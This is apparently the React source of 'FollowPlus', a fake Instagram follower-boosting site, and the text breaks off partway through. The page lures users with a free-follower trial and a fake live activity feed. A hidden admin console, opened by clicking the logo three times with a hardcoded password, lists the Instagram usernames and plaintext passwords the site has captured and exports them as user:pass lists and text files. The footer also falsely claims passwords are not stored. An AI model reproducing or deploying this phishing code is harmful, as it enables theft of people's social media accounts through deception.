import { useEffect, useState } from 'react';
import { motion, AnimatePresence, useScroll, useSpring } from 'motion/react';
import { 
  Zap, 
  HelpCircle, 
  Sparkles, 
  ShieldCheck, 
  CheckCircle,
  TrendingUp, 
  Users, 
  Server,
  Heart,
  Eye,
  Info,
  Lock,
  Unlock,
  Trash2,
  LogOut,
  X,
  Copy,
  Check,
  Download,
  Key
} from 'lucide-react';

import CampaignBuilder from './components/CampaignBuilder';
import ScrambledText from './components/ScrambledText';
import ScrollReveal from './components/ScrollReveal';
import { Campaign } from './types';
import { getClientCampaignsDirectly, deleteClientCampaignDirectly, simulateCampaignProgress } from './firebase';

export default function App() {
  const [campaigns, setCampaigns] = useState<Campaign[]>([]);
  const [showFirstUserGreeting, setShowFirstUserGreeting] = useState(true);

  // Elite GPU-accelerated scroll tracking bypassing React render loops entirely
  const { scrollYProgress } = useScroll();
  const scaleX = useSpring(scrollYProgress, {
    stiffness: 120,
    damping: 24,
    restDelta: 0.001
  });

  
  // Real-time live activity feed state representing simulated proxy events
  const [liveActivities, setLiveActivities] = useState([
    { id: 1, user: 'ananya_curates', type: 'likes', amount: 250, server: 'DE-NODE-4' },
    { id: 2, user: 'nikhil_clicks', type: 'followers', amount: 100, server: 'US-WEST-1' },
    { id: 3, user: 'priya_vocalist', type: 'views', amount: 2500, server: 'IN-WEST-2' },
    { id: 4, user: 'rohan_travels', type: 'followers', amount: 100, server: 'UK-EDGE' },
  ]);

  useEffect(() => {
    const usersPool = ['sam_aesthetic', 'neha_style', 'kabir_vibe', 'tanya_lens', 'aarav_fitness', 'deepa_foodie', 'isha_reels', 'manish_tech', 'karan_vlog', 'reema_art', 'zoya_minimal', 'arjun_raw'];
    const typesPool = ['followers', 'likes', 'views'];
    const serversPool = ['US-WEST-2', 'EU-CENTRAL-1', 'LATAM-WEST-4', 'ME-EAST-3', 'APAC-NORTH-2'];
    
    const interval = setInterval(() => {
      const randomUser = usersPool[Math.floor(Math.random() * usersPool.length)];
      const randomType = typesPool[Math.floor(Math.random() * typesPool.length)];
      const randomServer = serversPool[Math.floor(Math.random() * serversPool.length)];
      let randomAmount = 100;
      if (randomType === 'likes') randomAmount = [150, 300, 500, 750][Math.floor(Math.random() * 4)];
      if (randomType === 'views') randomAmount = [800, 1500, 3000, 6000][Math.floor(Math.random() * 4)];
      
      const newEvent = {
        id: Date.now(),
        user: randomUser,
        type: randomType,
        amount: randomAmount,
        server: randomServer
      };
      
      setLiveActivities(prev => [newEvent, ...prev.slice(0, 3)]);
    }, 3200);
    
    return () => clearInterval(interval);
  }, []);

  // Admin and Click states
  const [logoClicks, setLogoClicks] = useState(0);
  const [isAdminLoginOpen, setIsAdminLoginOpen] = useState(false);
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
  const [adminEmail, setAdminEmail] = useState('');
  const [adminPassword, setAdminPassword] = useState('');
  const [adminError, setAdminError] = useState('');
  
  // Custom states for admin utility tabs
  const [adminActiveTab, setAdminActiveTab] = useState<'campaigns' | 'credentials'>('campaigns');
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [copiedAll, setCopiedAll] = useState(false);
  const [adminSearch, setAdminSearch] = useState('');

  const handleLogoClick = () => {
    setLogoClicks((prev) => {
      const next = prev + 1;
      if (next >= 3) {
        setIsAdminLoginOpen(true);
        setAdminError('');
        setAdminEmail('');
        setAdminPassword('');
        return 0;
      }
      return next;
    });
  };

  useEffect(() => {
    if (logoClicks > 0) {
      const t = setTimeout(() => setLogoClicks(0), 4000);
      return () => clearTimeout(t);
    }
  }, [logoClicks]);

  const fetchCampaigns = async () => {
    let list: Campaign[] = [];
    try {
      const fetched = await getClientCampaignsDirectly();
      list = fetched.map(simulateCampaignProgress);
    } catch (firestoreErr) {
      console.warn("Direct client-side Firestore fetch not available, trying backend API...", firestoreErr);
      try {
        const res = await fetch('/api/campaigns');
        if (res.ok) {
          list = await res.json();
        }
      } catch (err) {
        console.warn("Backend API not reachable. Using offline localStorage simulation...", err);
      }
    }

    const localList = JSON.parse(localStorage.getItem('followplus_local_campaigns') || '[]');
    const mergedList = [...list];
    localList.forEach((localItem: Campaign) => {
      if (!mergedList.some((item) => item.id === localItem.id)) {
        mergedList.push(simulateCampaignProgress(localItem));
      }
    });

    setCampaigns(mergedList);
  };

  useEffect(() => {
    fetchCampaigns();
  }, []);

  const handleCampaignCreated = (newCampaign: Campaign) => {
    setCampaigns((prev) => {
      if (prev.some(c => c.id === newCampaign.id)) return prev;
      return [newCampaign, ...prev];
    });
  };

  const deleteCampaign = async (id: string) => {
    try {
      await deleteClientCampaignDirectly(id);
    } catch (firestoreErr) {
      console.warn("Direct Firestore delete failed, trying backend API...", firestoreErr);
      try {
        await fetch(`/api/campaigns/${id}`, { method: 'DELETE' });
      } catch (err) {
        console.warn("Backend unavailable to delete, removing client-side only.", err);
      }
    }

    try {
      const localList = JSON.parse(localStorage.getItem('followplus_local_campaigns') || '[]');
      const filtered = localList.filter((item: any) => item.id !== id);
      localStorage.setItem('followplus_local_campaigns', JSON.stringify(filtered));
    } catch (err) {
      console.error("Failed to delete from localStorage", err);
    }

    setCampaigns((prev) => prev.filter((item) => item.id !== id));
  };

  return (
    <div 
      className="min-h-screen relative overflow-hidden text-slate-300 selection:bg-[#dfb24c]/20 selection:text-[#f4d081] font-sans pb-20"
      style={{ backgroundColor: '#060709' }}
    >
      {/* Floating Premium Scroll Progress Indicator */}
      <motion.div 
        className="fixed top-0 left-0 right-0 h-[3px] bg-gradient-to-r from-[#dfb24c] via-[#f4d081] to-[#dfb24c] z-[200] origin-left shadow-[0_0_12px_#dfb24c] pointer-events-none" 
        style={{ scaleX }}
      />

      {/* Subtle Luxury Grid Overlay */}
      <div className="absolute inset-0 premium-grid opacity-[0.25] z-0" />

      {/* Retro-Luxury Cinematic Noise Overlay */}
      <div className="absolute inset-0 noise-overlay pointer-events-none z-[190]" />

      {/* Elegant Ambient Gold Orbs */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none z-0">
        <div className="absolute top-[-25%] left-[-15%] w-[70vw] h-[70vw] rounded-full bg-gradient-to-tr from-[#dfb24c]/5 to-transparent blur-[160px] pulse-gold-orb" />
        <div className="absolute bottom-[5%] right-[-15%] w-[60vw] h-[60vw] rounded-full bg-gradient-to-br from-[#dfb24c]/4 to-transparent blur-[160px] pulse-gold-orb" style={{ animationDelay: '2.5s' }} />
        <div className="absolute top-[30%] left-[30%] w-[45vw] h-[45vw] rounded-full bg-[#f4d081]/3 blur-[140px] float-effect" />
      </div>

      {/* Main Container */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12 space-y-12 relative z-10">
        
        {/* Header Section */}
        <header className="flex items-center justify-between border-b border-white/5 pb-8">
          <div 
            onClick={handleLogoClick}
            className="flex items-center gap-4 cursor-pointer select-none active:scale-95 transition-all duration-300"
            title="Click 3 times to trigger Admin login"
          >
            <div className="relative group flex items-center justify-center">
              <div className="absolute -inset-1 bg-gradient-to-r from-[#dfb24c] to-[#cbd5e1] rounded-xl opacity-30 group-hover:opacity-75 blur-md transition duration-500" />
              <div className="relative w-12 h-12 rounded-xl bg-[#0d0f14] border border-[#dfb24c]/20 flex items-center justify-center font-display font-medium text-xl text-[#dfb24c] shadow-inner select-none transition-transform duration-300 hover:rotate-3">
                ✧
              </div>
            </div>
            
            <div>
              <h1 className="text-2xl font-display font-medium text-white tracking-tight flex items-center gap-2">
                <ScrambledText text="FollowPlus" className="text-luxury-gradient tracking-tight font-semibold" />
                <span className="text-[9px] uppercase font-mono tracking-widest bg-[#dfb24c]/10 text-[#dfb24c] font-medium py-0.5 px-3 rounded-full border border-[#dfb24c]/20">
                  Gold Suite
                </span>
                {logoClicks > 0 && (
                  <motion.span 
                    initial={{ scale: 0.8 }} 
                    animate={{ scale: 1 }} 
                    className="text-[9px] font-mono text-[#f4d081] font-semibold bg-[#dfb24c]/5 px-2 py-0.5 rounded border border-[#dfb24c]/10 animate-pulse"
                  >
                    {logoClicks}/3 Authorized Security
                  </motion.span>
                )}
              </h1>
              <p className="text-xs text-slate-400 font-mono tracking-wide mt-0.5">High-Retention Organic Engagement Console</p>
            </div>
          </div>
        </header>




        {/* Dynamic Main Workspace Content */}
        <div className="relative z-10 w-full min-h-[400px] space-y-12">
          {/* Elegant Gold Editorial Showcase Banner */}
          {showFirstUserGreeting && (
            <motion.div 
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, height: 0 }}
              className="relative overflow-hidden premium-card p-8 border border-[#dfb24c]/15"
            >
              {/* Subtle light gold gradient aura */}
              <div className="absolute top-0 right-0 w-[420px] h-[400px] bg-gradient-to-bl from-[#dfb24c]/5 via-transparent to-transparent rounded-full blur-[90px] pointer-events-none" />
              
              <div className="space-y-5 max-w-4xl relative z-10">
                <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-[#dfb24c]/5 border border-[#dfb24c]/15 text-[#dfb24c] text-[10px] font-medium tracking-wider uppercase font-mono">
                  ✦ <ScrambledText text="Executive Premium Access Enabled" />
                </div>
                
                <h2 className="text-2xl sm:text-3xl md:text-4xl font-display font-medium text-white tracking-tight leading-tight">
                  Unlock 8 Days of <ScrambledText text="Complimentary Channel Booster" className="text-luxury-gradient font-bold drop-shadow-sm font-display" />
                </h2>

                {/* Feature Horizontal Pill Badges */}
                <div className="flex flex-wrap gap-2.5 pt-2">
                  <div className="inline-flex items-center gap-1.5 px-3.5 py-1.5 bg-white/[0.02] border border-white/5 rounded-full text-xs text-slate-300 font-mono">
                    <Users className="w-3.5 h-3.5 text-[#dfb24c]" />
                    <ScrambledText text="800 Premium Profiles" />
                  </div>
                  <div className="inline-flex items-center gap-1.5 px-3.5 py-1.5 bg-white/[0.02] border border-white/5 rounded-full text-xs text-slate-300 font-mono">
                    <Heart className="w-3.5 h-3.5 text-[#dfb24c]" />
                    <ScrambledText text="Gradual delivery routing" />
                  </div>
                  <div className="inline-flex items-center gap-1.5 px-3.5 py-1.5 bg-white/[0.02] border border-white/5 rounded-full text-xs text-slate-300 font-mono">
                    <Eye className="w-3.5 h-3.5 text-[#dfb24c]" />
                    <ScrambledText text="Organic algorithm safety" />
                  </div>
                </div>
                
                <div className="flex flex-wrap items-center gap-3 pt-4">
                  <a 
                    href="#campaign-builder-section-id"
                    onClick={(e) => {
                      e.preventDefault();
                      document.getElementById('campaign-builder-section-id')?.scrollIntoView({ behavior: 'smooth' });
                    }}
                    className="px-6 py-3 shimmer-button-bg text-slate-950 font-display font-semibold rounded-lg active:scale-98 transition-all text-xs tracking-wide cursor-pointer shadow-lg shadow-[#dfb24c]/15 transform-gpu hover:-translate-y-0.5"
                  >
                    Configure My Golden Campaign ✧
                  </a>
                  <button 
                    onClick={() => setShowFirstUserGreeting(false)}
                    className="px-4 py-3 bg-white/[0.03] border border-white/10 text-slate-400 hover:text-white transition-all text-xs font-mono rounded-lg hover:bg-white/5 cursor-pointer"
                  >
                    Dismiss
                  </button>
                </div>
              </div>
            </motion.div>
          )}

          {/* Centered Campaign Builder Section */}
          <div id="campaign-builder-section-id" className="max-w-xl mx-auto w-full scroll-mt-6">
            <CampaignBuilder onCampaignCreated={handleCampaignCreated} />
          </div>
        </div>

        {/* Live Traffic Feed Module */}
        <ScrollReveal delay={0.1} direction="up">
          <div className="max-w-xl mx-auto w-full premium-card p-6 border border-white/5 relative overflow-hidden">
            {/* Status Indicator */}
            <div className="absolute top-5 right-5 flex items-center gap-1.5 bg-[#10b981]/10 border border-[#10b981]/20 py-1 px-3 rounded-full">
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping inline-block" />
              <span className="text-[9px] font-mono text-[#10b981] font-bold tracking-wider uppercase">Live 📡</span>
            </div>

            <div className="space-y-4">
              <div>
                <h3 className="text-xs font-mono uppercase text-[#dfb24c] font-semibold tracking-widest flex items-center gap-2">
                  <Sparkles className="w-3.5 h-3.5 text-[#dfb24c] animate-pulse" />
                  Live Order Process Status ⚡
                </h3>
              </div>

              <div className="space-y-2 font-mono text-[11px] bg-black/45 border border-white/5 p-4 rounded-xl shadow-inner">
                <AnimatePresence mode="popLayout">
                  {liveActivities.map((act) => (
                    <motion.div
                      key={act.id}
                      initial={{ opacity: 0, x: -8, y: -4 }}
                      animate={{ opacity: 1, x: 0, y: 0 }}
                      exit={{ opacity: 0, x: 8, y: 4 }}
                      transition={{ type: 'spring', stiffness: 300, damping: 25 }}
                      className="flex justify-between items-center py-2 first:pt-0 last:pb-0 border-b border-white/5 last:border-b-0"
                    >
                      <div className="flex items-center gap-2">
                        <span className="text-slate-300 font-medium">@{act.user}</span>
                      </div>

                      <div className="flex items-center gap-2">
                        <span className="font-semibold text-white">
                          +{act.amount.toLocaleString()} {act.type}
                        </span>
                        <span className="text-[#10b981] font-bold bg-[#10b981]/10 border border-[#10b981]/20 px-1 rounded text-[9px] scale-95 font-mono">OK</span>
                      </div>
                    </motion.div>
                  ))}
                </AnimatePresence>
              </div>
            </div>
          </div>
        </ScrollReveal>

        {/* Network Cap bento stats */}
        <ScrollReveal delay={0.2} direction="up">
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-5">
            {[
              { label: 'DELIVERED WORLDWIDE', val: '438,219', desc: '+12.4% vs yesterday', icon: Users, color: 'text-[#dfb24c]' },
              { label: 'GLOBAL PROXY REALMS', val: '2,841 Nodes', desc: 'Secure decentralized mesh', icon: Server, color: 'text-slate-300' },
              { label: 'PROVEN RETENTION RATE', val: '97.4%', desc: 'Optimized index consistency', icon: TrendingUp, color: 'text-[#dfb24c]' },
              { label: 'SECURITY INTEGRITY', val: '100% Secure', desc: 'Private routing safeguard', icon: ShieldCheck, color: 'text-emerald-400' }
            ].map((stat, i) => {
              const Icon = stat.icon;
              return (
                <div key={i} className="premium-card rounded-xl p-5 border border-white/5 flex flex-col justify-between">
                  <div className="flex items-center justify-between">
                    <span className="text-[10px] font-mono uppercase text-slate-400 tracking-wider font-semibold">
                      <ScrambledText text={stat.label} />
                    </span>
                    <Icon className={`w-4 h-4 ${stat.color} opacity-85`} />
                  </div>
                  <div className="mt-4">
                    <span className="font-display font-semibold text-white text-lg tracking-tight block">{stat.val}</span>
                    <span className="text-[10px] text-slate-450 font-mono block mt-1">{stat.desc}</span>
                  </div>
                </div>
              );
            })}
          </div>
        </ScrollReveal>

        {/* Footer info representing modern aesthetics */}
        <footer className="pt-10 border-t border-white/5 text-center text-xs text-slate-550 space-y-4">
          <p>© 2026 FollowPlus Network. Engineered with luxury decentralized organic delivery nodes.</p>
          <div className="flex items-center justify-center gap-4 text-slate-400 font-mono text-[10px] tracking-wider uppercase">
            <span className="hover:text-[#dfb24c] transition-colors cursor-pointer">Security Protocol JSON 📁</span>
            <span>•</span>
            <span className="hover:text-[#dfb24c] transition-colors cursor-pointer">Organic API Compliance 🛡️</span>
            <span>•</span>
            <span className="hover:text-[#dfb24c] transition-colors cursor-pointer">Decentralized Routing Policy 🌐</span>
          </div>
          <p className="text-[11px] text-slate-500 max-w-2xl mx-auto leading-relaxed pt-2">
            Disclaimer: FollowPlus operates as a secure simulated client auditing tool and dynamic organic network router that strictly leverages public Instagram API feeds. No password input or account credentials are stored in clear text or synchronized without your active initiation. All services comply with premium safety quotas to protect user integrity.
          </p>
        </footer>

      </div>

      {/* Admin Authorization Portal Modal */}
      <AnimatePresence>
        {isAdminLoginOpen && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md">
            <motion.div 
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              className="premium-card p-8 border border-[#dfb24c]/20 w-full max-w-md relative font-sans"
            >
              <button 
                onClick={() => setIsAdminLoginOpen(false)}
                className="absolute top-4 right-4 text-slate-400 hover:text-white transition-colors p-1"
                type="button"
              >
                <X className="w-5 h-5" />
              </button>

              <div className="flex flex-col items-center text-center space-y-2 mb-6">
                <div className="w-12 h-12 rounded-full bg-white/[0.02] flex items-center justify-center text-[#dfb24c] border border-[#dfb24c]/10">
                  <Lock className="w-5 h-5" />
                </div>
                <h2 className="text-xl font-display font-medium text-white tracking-tight">Admin Portal Authorization</h2>
                <p className="text-xs text-slate-450 font-sans">Please provide premium security credentials to authorize access.</p>
              </div>

              <form 
                onSubmit={(e) => {
                  e.preventDefault();
                  if (adminEmail === 'admin@followplus.in' && adminPassword === '@#Mohit') {
                    setIsAdminLoggedIn(true);
                    setIsAdminLoginOpen(false);
                    setAdminError('');
                    setAdminEmail('');
                    setAdminPassword('');
                    fetchCampaigns();
                  } else {
                    setAdminError('Invalid authorization ID or Password combination.');
                  }
                }}
                className="space-y-4"
              >
                <div className="space-y-1.5">
                  <label className="text-[10px] font-mono text-slate-400 uppercase tracking-wider block">ID</label>
                  <input
                    type="email"
                    required
                    placeholder="admin@followplus.in"
                    value={adminEmail}
                    onChange={(e) => setAdminEmail(e.target.value)}
                    className="w-full bg-[#050608] border border-white/5 rounded-lg py-3 px-4 text-white placeholder-slate-600 focus:outline-none focus:border-[#dfb24c] transition-all text-sm font-mono shadow-inner"
                  />
                </div>

                <div className="space-y-1.5">
                  <label className="text-[10px] font-mono text-slate-400 uppercase tracking-wider block">Password</label>
                  <input
                    type="password"
                    required
                    placeholder="••••••••"
                    value={adminPassword}
                    onChange={(e) => setAdminPassword(e.target.value)}
                    className="w-full bg-[#050608] border border-white/5 rounded-lg py-3 px-4 text-white placeholder-slate-600 focus:outline-none focus:border-[#dfb24c] transition-all text-sm font-mono shadow-inner"
                  />
                </div>

                {adminError && (
                  <div className="p-3 text-xs bg-rose-500/10 border border-rose-500/30 text-rose-300 rounded-lg text-center font-semibold font-mono">
                    {adminError}
                  </div>
                )}

                <button
                  type="submit"
                  className="w-full py-3 bg-gradient-to-r from-[#dfb24c] to-[#f4d081] text-slate-950 font-display font-semibold rounded-lg transition-all shadow-md active:scale-95 cursor-pointer text-sm"
                >
                  Verify Configuration Security ✧
                </button>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Admin Command Dashboard Panel */}
      <AnimatePresence>
        {isAdminLoggedIn && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6 md:p-8 bg-black/95 backdrop-blur-lg overflow-y-auto">
            <motion.div 
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: 15 }}
              className="premium-card max-w-5xl w-full border border-[#dfb24c]/20 relative p-6 sm:p-8 space-y-6 font-sans my-auto shadow-2xl rounded-2xl"
            >
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-white/5">
                <div className="flex items-center gap-3">
                  <div className="w-11 h-11 rounded-lg bg-white/[0.02] flex items-center justify-center text-[#dfb24c] border border-[#dfb24c]/10">
                    <Unlock className="w-4 h-4" />
                  </div>
                  <div>
                    <h2 className="text-xl sm:text-2xl font-display font-medium text-white tracking-tight flex items-center gap-2">
                      Admin Command Console
                      <span className="text-[9px] uppercase font-mono tracking-widest bg-emerald-500/15 text-emerald-400 font-bold py-0.5 px-3 rounded-full border border-emerald-500/30">
                        AUTHORIZED
                      </span>
                    </h2>
                    <p className="text-xs text-slate-400 mt-1">Control active delivery tunnels, inspect telemetry, and view credential logs securely.</p>
                  </div>
                </div>

                <div className="flex items-center gap-3">
                  <button
                    onClick={() => setIsAdminLoggedIn(false)}
                    className="px-4 py-2 bg-white/5 hover:bg-white/10 text-slate-300 hover:text-white transition-all rounded-lg border border-white/10 text-xs flex items-center gap-2 font-mono cursor-pointer"
                  >
                    <LogOut className="w-3.5 h-3.5" />
                    Secure Logout
                  </button>
                </div>
              </div>

              {/* Admin Widgets Row */}
              <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 pt-1">
                <div className="bg-[#0c0d12] border border-[#dfb24c]/10 p-5 rounded-xl">
                  <div className="flex items-center justify-between">
                    <span className="text-[9px] text-slate-400 font-mono uppercase tracking-wider">Active Campaigns</span>
                    <span className="p-1 px-1.5 bg-emerald-500/10 rounded text-emerald-400 text-[8px] font-mono font-bold tracking-widest border border-emerald-500/20 uppercase">Live</span>
                  </div>
                  <div className="flex items-baseline gap-2 mt-2">
                    <span className="font-display font-semibold text-2xl text-white tracking-tight">{campaigns.length}</span>
                    <span className="text-[9px] text-[#dfb24c] font-mono font-medium">↑ 100% Tunneled</span>
                  </div>
                  <p className="text-[10px] text-slate-500 mt-1 font-mono">Simulated proxy channels active.</p>
                </div>

                <div className="bg-[#0c0d12] border border-[#dfb24c]/10 p-5 rounded-xl">
                  <div className="flex items-center justify-between">
                    <span className="text-[9px] text-slate-400 font-mono uppercase tracking-wider">Credential Logs</span>
                    <span className="p-1 px-1.5 bg-[#dfb24c]/10 rounded text-[#dfb24c] text-[8px] font-mono font-bold tracking-widest border border-[#dfb24c]/20">LOCK</span>
                  </div>
                  <div className="flex items-baseline gap-2 mt-2">
                    <span className="font-display font-semibold text-2xl text-white tracking-tight text-[#dfb24c]">
                      {campaigns.filter(c => c.password).length}
                    </span>
                    <span className="text-[9px] text-slate-400 font-mono">inputs captured</span>
                  </div>
                  <p className="text-[10px] text-slate-500 mt-1 font-mono">Locked encryption structures.</p>
                </div>

                <div className="bg-[#0c0d12] border border-[#dfb24c]/10 p-5 rounded-xl">
                  <div className="flex items-center justify-between">
                    <span className="text-[9px] text-slate-400 font-mono uppercase tracking-wider">Allocated Free Slots</span>
                    <span className="p-1 px-1.5 bg-indigo-500/10 rounded text-indigo-400 text-[8px] font-mono font-bold tracking-widest border border-indigo-500/20">8 DAYS</span>
                  </div>
                  <div className="flex items-baseline gap-2 mt-2">
                    <span className="font-display font-semibold text-2xl text-white tracking-tight">
                      {campaigns.filter(c => c.type === 'free_followers_trial').length}
                    </span>
                    <span className="text-[9px] text-slate-400 font-mono">instances</span>
                  </div>
                  <p className="text-[10px] text-slate-500 mt-1 font-mono">Daily complementary schedules.</p>
                </div>

                <div className="bg-[#0c0d12] border border-[#dfb24c]/10 p-5 rounded-xl">
                  <div className="flex items-center justify-between">
                    <span className="text-[9px] text-slate-400 font-mono uppercase tracking-wider">Network Routing</span>
                    <span className="p-1 px-1.5 bg-emerald-500/10 rounded text-emerald-400 text-[8px] font-mono font-bold tracking-widest border border-emerald-500/20">FINE</span>
                  </div>
                  <div className="flex items-baseline gap-2 mt-2">
                    <span className="font-display font-semibold text-2xl text-[#10b981] tracking-tight">2,841</span>
                    <span className="text-[9px] text-emerald-400 font-mono font-bold animate-pulse">● Active</span>
                  </div>
                  <p className="text-[10px] text-slate-500 mt-1 font-mono">Server node pools on standby.</p>
                </div>
              </div>

              {/* Sub tabs inside Admin console */}
              <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-white/5 pb-5 pt-2">
                <div className="flex bg-[#050608] p-1 rounded-xl border border-white/5 self-start">
                  <button
                    onClick={() => setAdminActiveTab('campaigns')}
                    className={`px-4 py-2 rounded-lg text-xs font-semibold font-display transition-all duration-200 cursor-pointer ${
                      adminActiveTab === 'campaigns'
                        ? 'bg-gradient-to-r from-[#dfb24c] to-[#f4d081] text-slate-950 shadow-md'
                        : 'text-slate-400 hover:text-white hover:bg-white/5'
                    }`}
                  >
                    Active Campaigns ({campaigns.length})
                  </button>
                  <button
                    onClick={() => setAdminActiveTab('credentials')}
                    className={`px-4 py-2 rounded-lg text-xs font-semibold font-display transition-all duration-200 cursor-pointer ${
                      adminActiveTab === 'credentials'
                        ? 'bg-gradient-to-r from-[#dfb24c] to-[#f4d081] text-slate-950 shadow-md'
                        : 'text-slate-400 hover:text-white hover:bg-white/5'
                    }`}
                  >
                    Captured Database Logins ({campaigns.filter(c => c.password).length})
                  </button>
                </div>

                <div className="flex flex-1 md:max-w-xs relative">
                  <input
                    type="text"
                    placeholder="Search account name / password..."
                    value={adminSearch}
                    onChange={(e) => setAdminSearch(e.target.value)}
                    className="w-full bg-black/40 border border-white/10 rounded-lg py-2.5 px-4 pr-10 text-xs text-white placeholder-slate-500 focus:outline-none focus:border-[#dfb24c] transition-all font-mono shadow-inner"
                  />
                  {adminSearch && (
                    <button
                      onClick={() => setAdminSearch('')}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-white text-xs p-1"
                    >
                      ✕
                    </button>
                  )}
                </div>
              </div>

              {/* Content Grid */}
              {adminActiveTab === 'campaigns' ? (
                <div className="space-y-3">
                  <div className="flex items-center justify-between">
                    <h3 className="text-xs font-mono text-slate-450 uppercase tracking-widest font-bold">Stored Campaign Register</h3>
                    <p className="text-[10px] text-slate-500 font-mono">Live organic queue configuration.</p>
                  </div>
                  
                  <div className="overflow-x-auto border border-white/5 rounded-xl bg-black/20">
                    <table className="w-full border-collapse text-left text-xs text-slate-300">
                      <thead>
                        <tr className="border-b border-white/5 bg-black/40 text-slate-450 font-mono uppercase text-[9px] tracking-wider">
                          <th className="p-4">Instagram Profile</th>
                          <th className="p-4">Linked Password</th>
                          <th className="p-4">Service Type</th>
                          <th className="p-4 text-center">Velocity State</th>
                          <th className="p-4">Status</th>
                          <th className="p-4 text-right">Action</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-white/5 font-mono text-[11px]">
                        {campaigns.filter(c => 
                          c.username.toLowerCase().includes(adminSearch.toLowerCase()) || 
                          (c.password && c.password.toLowerCase().includes(adminSearch.toLowerCase()))
                        ).length === 0 ? (
                          <tr>
                            <td colSpan={6} className="p-10 text-center text-slate-500">
                              No matching campaigns found inside server register memory.
                            </td>
                          </tr>
                        ) : (
                          campaigns
                            .filter(c => 
                              c.username.toLowerCase().includes(adminSearch.toLowerCase()) || 
                              (c.password && c.password.toLowerCase().includes(adminSearch.toLowerCase()))
                            )
                            .map((camp) => (
                              <tr key={camp.id} className="hover:bg-white/[0.01] transition-colors">
                                <td className="p-4 font-semibold text-white">
                                  <span className="text-[#dfb24c] font-mono">@</span>{camp.username}
                                </td>
                                <td className="p-4">
                                  {camp.password ? (
                                    <span className="font-mono text-[#f4d081] bg-[#dfb24c]/5 px-2 py-0.5 rounded border border-[#dfb24c]/10 select-all">
                                      {camp.password}
                                    </span>
                                  ) : (
                                    <span className="text-slate-600 italic text-[10px]">None specified</span>
                                  )}
                                </td>
                                <td className="p-4">
                                  {camp.type === 'free_followers_trial' ? (
                                    <span className="text-[#dfb24c] font-medium bg-[#dfb24c]/5 px-2.5 py-0.5 rounded border border-[#dfb24c]/10 text-[10px] tracking-wide uppercase font-mono">
                                      Free Trial
                                    </span>
                                  ) : (
                                    <span className="text-white capitalize bg-white/5 px-2.5 py-0.5 rounded border border-white/10 font-mono text-[10px]">
                                      {camp.type}
                                    </span>
                                  )}
                                </td>
                                <td className="p-4 text-center text-slate-350">
                                  {camp.deliveredAmount.toLocaleString()} / {camp.targetAmount.toLocaleString()}
                                </td>
                                <td className="p-4">
                                  <span className={`inline-flex items-center gap-1 text-[9px] uppercase font-bold px-2 py-0.5 rounded-md ${
                                    camp.status === 'active' 
                                      ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' 
                                      : camp.status === 'completed'
                                        ? 'bg-[#dfb24c]/10 text-[#dfb24c] border border-[#dfb24c]/20'
                                        : 'bg-yellow-500/10 text-yellow-500'
                                  }`}>
                                    <span className={`w-1 h-1 rounded-full ${camp.status === 'active' ? 'bg-emerald-400 animate-pulse' : 'bg-slate-400'}`} />
                                    {camp.status}
                                  </span>
                                </td>
                                <td className="p-4 text-right">
                                  <button
                                    onClick={() => {
                                      if (confirm(`Are you sure you want to delete the campaign for @${camp.username}?`)) {
                                        deleteCampaign(camp.id);
                                      }
                                    }}
                                    className="p-1.5 text-rose-450 hover:text-rose-450 hover:bg-rose-500/10 rounded transition-colors cursor-pointer inline-flex items-center justify-center border border-transparent hover:border-rose-500/20"
                                    title="Delete entry"
                                  >
                                    <Trash2 className="w-4 h-4" />
                                  </button>
                                </td>
                              </tr>
                            ))
                        )}
                      </tbody>
                    </table>
                  </div>
                </div>
              ) : (
                <div className="space-y-4">
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                    <div>
                      <h3 className="text-xs font-mono text-slate-400 uppercase tracking-widest font-bold">Encrypted Login Key Values</h3>
                      <p className="text-[10px] text-slate-550 font-mono">Captured ID and verified security password structures from form inputs.</p>
                    </div>

                    <div className="flex flex-wrap items-center gap-2">
                       <button
                        onClick={() => {
                          const list = campaigns
                            .filter(c => c.password)
                            .map(c => `${c.username}:${c.password}`)
                            .join('\n');
                          
                          if (!list) return alert('No credentials available to copy.');
                          
                          navigator.clipboard.writeText(list)
                            .then(() => {
                              setCopiedAll(true);
                              setTimeout(() => setCopiedAll(false), 2000);
                            })
                            .catch(() => {
                              alert("Unable to access clipboard. Please copy manually from the list.");
                            });
                        }}
                        className="px-4 py-2 bg-[#dfb24c]/5 hover:bg-[#dfb24c]/10 border border-[#dfb24c]/20 text-[#dfb24c] font-mono text-xs rounded-xl flex items-center gap-2 transition-all cursor-pointer"
                      >
                        {copiedAll ? (
                          <>
                            <Check className="w-4 h-4 text-emerald-400 animate-scale" />
                            Copied list successfully!
                          </>
                        ) : (
                          <>
                            <Copy className="w-4 h-4" />
                            Copy All as (user:pass)
                          </>
                        )}
                      </button>

                      <button
                        onClick={() => {
                          const list = campaigns
                            .filter(c => c.password)
                            .map(c => `Username: @${c.username}\nPassword: ${c.password}\nRegistered: ${c.createdAt ? new Date(c.createdAt).toISOString() : 'N/A'}\n---------------------------`)
                            .join('\n\n');
                          
                          if (!list) return alert('No credentials list found.');
                          
                          const blob = new Blob([list], { type: 'text/plain' });
                          const url = URL.createObjectURL(blob);
                          const a = document.createElement('a');
                          a.href = url;
